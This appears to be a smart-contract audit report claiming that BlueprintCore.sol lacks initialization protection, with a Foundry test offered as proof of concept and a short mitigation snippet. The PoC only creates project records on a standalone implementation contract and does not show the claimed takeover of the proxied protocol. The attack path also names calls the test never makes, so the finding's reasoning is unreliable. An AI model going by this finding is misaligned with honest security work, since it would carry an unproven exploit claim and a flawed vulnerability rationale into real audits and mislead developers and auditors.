# Lack of Initialization Protection in BlueprintCore

### Summary

The absence of initialization protection in BlueprintCore.sol will cause a complete loss of control for the protocol as an attacker will initialize the implementation contract directly.

### Root Cause

In BlueprintCore.sol, there is no constructor or initializer function to prevent the initialization of the implementation contract, which is inherited by BlueprintV5 using the UUPS upgradeable pattern.

### Internal Pre-conditions

The BlueprintCore implementation contract needs to be deployed standalone (not behind a proxy).

### External Pre-conditions

None required.

### Attack Path

- Attacker deploys the BlueprintCore contract directly or interacts with an already deployed implementation contract.
- Attacker calls an inherited initializer (e.g., from EIP712Upgradeable) or a public state-modifying function (e.g., setProjectId) to set critical state variables (e.g., projects, latestProjectID) to malicious values.
- Attacker manipulates the contract state before the legitimate proxy (BlueprintV5) is deployed, effectively taking control of the system.

### Impact

- The protocol suffers a complete loss of control over its state, as the attacker can set arbitrary values in mappings and variables, disrupting all subsequent operations.

### PoC

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src//BlueprintCore.sol";

contract BlueprintCoreExploitTest is Test {
    BlueprintCore blueprintCore;
    address attacker = address(0x1);

    function setUp() public {
        // Deploy the implementation contract directly (not behind a proxy)
        blueprintCore = new BlueprintCore();
        vm.deal(attacker, 1 ether);
    }

    function test_InitializeExploit() public {
        vm.startPrank(attacker);
        // Attacker creates a project directly on the implementation contract
        bytes32 projectId = blueprintCore.createProjectID();
        
        // Verify attacker has control over the project
        bytes32 latestProjectId = blueprintCore.getLatestUserProjectID(attacker);
        assertEq(latestProjectId, projectId, "Attacker should own the project ID");

        // Simulate setting additional state to disrupt future proxy deployment
        blueprintCore.createProjectIDAndProposalRequest(projectId, "param", "url");
        bytes32 requestId = blueprintCore.getLatestProposalRequestID(attacker);
        assertTrue(requestId != bytes32(0), "Attacker should have a proposal request ID");

        vm.stopPrank();
    }
}
```

### Mitigation

- use an initializer function with Initializable:

```solidity

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
contract BlueprintCore is Initializable, EIP712, Payment {
    function initialize() public initializer {
        // Initialization logic
    }
}
```
